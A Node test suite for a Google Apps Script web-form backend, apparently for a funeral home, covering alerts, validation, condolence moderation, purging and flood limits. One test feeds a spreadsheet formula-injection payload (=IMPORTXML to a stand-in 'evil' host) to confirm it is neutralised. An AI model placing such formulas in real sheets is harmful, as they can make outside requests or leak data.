// Runs the generated Google Apps Script (tools/apps-script/Code.gs) in Node with small stand-ins
// for SpreadsheetApp, MailApp, etc., so the Sheets backend is tested before anyone pastes it.
import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import vm from "node:vm";

const code = readFileSync(new URL("../../tools/apps-script/Code.gs", import.meta.url), "utf8");
const old = String(Date.now() - 10_000);
let ctx, sheets, mail, cache;

function makeSheet(name) {
  const rows = [];
  return {
    name, rows,
    getMaxRows: () => 1000,
    getRange: (r, c, nr, nc) => ({
      setNumberFormat() { return this; }, setFontWeight() { return this; },
      setValues(v) { rows[r - 1] = v[0].slice(); return this; },
      setValue(v) { rows[r - 1][c - 1] = v; return this; }
    }),
    setFrozenRows() {},
    appendRow: (v) => rows.push(v.slice()),
    getLastRow: () => rows.length,
    getDataRange: () => ({ getValues: () => rows.map((r) => r.slice()) }),
    deleteRow: (i) => rows.splice(i - 1, 1)
  };
}

beforeEach(() => {
  sheets = new Map(); mail = []; cache = new Map();
  const ss = {
    getSheetByName: (n) => sheets.get(n) || null,
    insertSheet: (n) => { const s = makeSheet(n); sheets.set(n, s); return s; },
    getSheets: () => [...sheets.values()], deleteSheet: (s) => sheets.delete(s.name),
    getUrl: () => "https://docs.google.com/spreadsheets/d/test"
  };
  ctx = vm.createContext({
    console, Date, JSON, Math, Object, Array, String, Number, RegExp, Error,
    SpreadsheetApp: { getActiveSpreadsheet: () => ss },
    ContentService: { MimeType: { JSON: "json" }, createTextOutput: (t) => ({ text: t, setMimeType() { return this; } }) },
    CacheService: { getScriptCache: () => ({ get: (k) => cache.get(k) ?? null, put: (k, v) => cache.set(k, v) }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    Utilities: { getUuid: () => "abcdef12-3456-7890-abcd-ef1234567890" },
    MailApp: { sendEmail: (m) => mail.push(m) },
    ScriptApp: { getProjectTriggers: () => [], deleteTrigger() {}, newTrigger: () => ({ timeBased: () => ({ everyDays: () => ({ atHour: () => ({ create() {} }) }) }) }) }
  });
  vm.runInContext(code, ctx);
  vm.runInContext("setup()", ctx);
});

const post = (body) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify({ _ts: old, ...body }) } }).text);
const get = (p) => JSON.parse(ctx.doGet({ parameter: p }).text);

test("setup creates one tab per form, with a header row", () => {
  assert.equal(sheets.size, 10);
  assert.equal(JSON.stringify(sheets.get("callback").rows[0].slice(0, 5)), JSON.stringify(["reference", "received_at", "status", "respond_by", "expires_at"]));
});

test("valid urgent call-back is stored as text and emails a 🔴 alert with name and phone", () => {
  const r = post({ form: "callback", name: "Ann", phone: "0871234567", reason: "death", message: "private", consent: "yes" });
  assert.equal(r.ok, true);
  assert.equal(r.reference, "ABCDEF12");
  const row = sheets.get("callback").rows[1];
  assert.equal(row[2], "new");
  assert.ok(row.includes("0871234567"));
  assert.equal(mail.length, 1);
  assert.match(mail[0].subject, /^🔴 URGENT: Urgent call-back request/);
  assert.match(mail[0].body, /Phone: 0871234567/);
  assert.doesNotMatch(mail[0].body, /private/);       // free-text message not emailed
  assert.equal(mail[0].to, "snagpal2008@gmail.com");
});

test("validation errors and spam traps", () => {
  const bad = post({ form: "callback", name: "", phone: "x" });
  assert.equal(bad.error, "Please check the highlighted fields.");
  assert.ok(bad.fields.phone);
  assert.equal(post({ form: "nope" }).error, "Unknown form.");
  assert.equal(post({ form: "callback", website: "spam" }).message, "Thank you.");
  assert.equal(sheets.get("callback").rows.length, 1);
  assert.equal(JSON.parse(ctx.doPost({ postData: { contents: "not json" } }).text).error, "We could not read that form.");
});

test("spreadsheet formula injection is neutralised", () => {
  post({ form: "callback", name: "=IMPORTXML(\"http://evil\",\"//a\")", phone: "0871234567", reason: "other", consent: "yes" });
  assert.ok(sheets.get("callback").rows[1].some((c) => c.startsWith("'=IMPORTXML")));
});

test("condolences: pending until approved in the sheet, email never published", () => {
  post({ form: "condolence", notice: "n1", name: "Pat", town: "Naas", email: "p@x.ie", message: "With sympathy", publish_ok: "yes", consent: "yes" });
  assert.equal(mail.length, 0);                      // condolences are moderated, not alerted
  assert.deepEqual(get({ action: "condolences", notice: "n1" }), []);
  const sh = sheets.get("condolence"); sh.rows[1][2] = "Approved ";   // staff types it in the sheet
  const [c] = get({ action: "condolences", notice: "n1" });
  assert.equal(c.message, "With sympathy");
  assert.equal(c.email, undefined);
  assert.deepEqual(get({ action: "condolences", notice: "other" }), []);
});

test("purge deletes rows past their retention date", () => {
  post({ form: "quote", name: "Q", email: "q@x.ie", funeral_type: "burial", coffin: "simple", consent: "yes" });
  const sh = sheets.get("quote"); sh.rows[1][4] = "2020-01-01T00:00:00.000Z";
  vm.runInContext("purge()", ctx);
  assert.equal(sh.rows.length, 1);
});

test("flood protection: more than 120 posts in 10 minutes are refused", () => {
  for (let i = 0; i < 120; i++) post({ form: "nope" });
  assert.match(post({ form: "callback" }).error, /lot of messages/);
});
